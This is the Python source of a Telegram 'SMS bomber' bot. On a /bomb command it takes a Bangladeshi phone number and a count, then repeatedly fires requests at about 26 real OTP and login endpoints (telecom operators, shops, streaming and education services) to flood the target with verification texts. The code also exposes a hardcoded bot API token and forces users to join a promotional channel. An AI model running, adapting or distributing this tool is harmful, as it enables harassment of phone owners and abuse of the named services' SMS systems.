import telebot
import requests
import threading
import time
import sys
import os
from flask import Flask

# ==========================================
# 🌐 WEB SERVER (Keep Bot Alive on Render)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running Successfully!"

def run_web_server():
    # Render default port 10000 ব্যবহার করে
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAHZVqL_RxVGZ9eSlMoOheYtR2JDZtRsHiM'  # <--- আপনার বটের টোকেন বসান
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "@Suptho1_"
CHANNEL_ID = "@SH_tricks"    # <--- আপনার চ্যানেলের ইউজারনেম (@ সহ)
VERSION = "5.0 (Most POWERFUL)"

# বট সেটআপ
bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 🛡️ FORCE JOIN CHECKER
# ==========================================
def is_user_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# ==========================================
# 🌐 API ENGINE (All 27+ APIs Added)
# ==========================================
def api_hit(url, method, data=None, json=None, headers=None):
    try:
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"}
        if headers: head.update(headers)
        if method == "POST":
            requests.post(url, data=data, json=json, headers=head, timeout=4)
        else:
            requests.get(url, headers=head, timeout=4)
    except: pass

def attack_all_apis(target):
    # --- আপনার দেওয়া সকল এপিআই এখানে ---
    api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
    api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
    api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
    api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
    api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
    api_hit("https://www.bd.airtel.com/en", "POST", data=f'[{{"msisdn":"{target}"}}]', headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"})
    api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN", "deviceType": "WEB"})
    api_hit(f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=0cAFcWeA6egvAsgG1hCZ6i...&phoneNumber=%2B88{target}", "POST")
    api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json={"target": "88"+target, "resend": False})
    api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"})
    api_hit("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
    api_hit("https://bb-api.bohubrihi.com/public/activity/otp", "POST", json={"phone": target, "intent": "login"})
    api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
    api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
    api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
    api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target})
    api_hit(f"https://fundesh.com.bd/api/auth/generateOTP", "POST", json={"msisdn": "88"+target})
    api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
    api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}", "GET")
    api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
    api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
    api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json={"phoneNumber":"+88"+target})
    api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target, "name": "User"})
    api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})

# ==========================================
# 💣 ATTACK MANAGER
# ==========================================
def start_attack(chat_id, target, amount):
    msg = bot.send_message(chat_id, "⚡ **System Initializing...**", parse_mode='Markdown')
    time.sleep(1)
    
    bot.edit_message_text(f"🚀 **Attack Launched!**\n\n🎯 Target: `{target}`\n💣 Amount: `{amount}`\n☠️ Status: **Bombing...**", chat_id, msg.message_id, parse_mode='Markdown')
    
    sent = 0
    for i in range(amount):
        threading.Thread(target=attack_all_apis, args=(target,)).start()
        sent += 1
        if sent % 5 == 0:
            try:
                bot.edit_message_text(f"💣 **Bombing in Progress...**\n\n🎯 Target: `{target}`\n🔥 Sent: {sent}/{amount}\n⚡ APIs: 27+", chat_id, msg.message_id, parse_mode='Markdown')
            except: pass
        time.sleep(1)

    bot.edit_message_text(f"✅ **Mission Completed!**\n\n🎯 Target: `{target}`\n🔥 Total Sent: {sent}\n👑 **Power By: {OWNER_NAME}**\n💬 **Contact: {OWNER_USERNAME}**", chat_id, msg.message_id, parse_mode='Markdown')

# ==========================================
# 🤖 BOT COMMANDS
# ==========================================
@bot.message_handler(commands=['start'])
def welcome(message):
    text = f"""
🔥 **SUPTHO BOMBER BOT** 🔥
───────────────────────
👋 Hello **{message.from_user.first_name}**,

বোম্বিং শুরু করতে নিচের ফরম্যাট ব্যবহার করুন:
👉 `/bomb <Number> <Amount>`

📢 Channel: {CHANNEL_ID}
👑 Owner: {OWNER_NAME}
💬 Support: {OWNER_USERNAME}
    """
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    if not is_user_joined(message.from_user.id):
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{CHANNEL_ID.replace('@', '')}")
        markup.add(btn)
        bot.reply_to(message, "❌ **অ্যাক্সেস রিফিউজড!**\n\nবটটি ব্যবহার করতে প্রথমে আমাদের চ্যানেলে জয়েন করুন।", reply_markup=markup)
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ **সঠিক নিয়ম:** `/bomb Number Amount`")
            return
            
        target, amount = parts[1], int(parts[2])
        if len(target) != 11 or not target.isdigit():
            bot.reply_to(message, "⚠️ ১১ ডিজিটের নাম্বার দিন।")
            return
        if amount > 100:
            bot.reply_to(message, "⚠️ সর্বোচ্চ লিমিট ১০০।")
            return

        threading.Thread(target=start_attack, args=(message.chat.id, target, amount)).start()
        
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")

# ==========================================
# 🔥 WEBHOOK REMOVE & RUNNER
# ==========================================
if __name__ == "__main__":
    try:
        bot.remove_webhook()
        print("✅ Webhook Removed.")
    except: pass
    
    keep_alive()
    print(f"✅ {OWNER_NAME}'s Bot is Running on Render...")

    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=20)
        except Exception as e:
            time.sleep(5)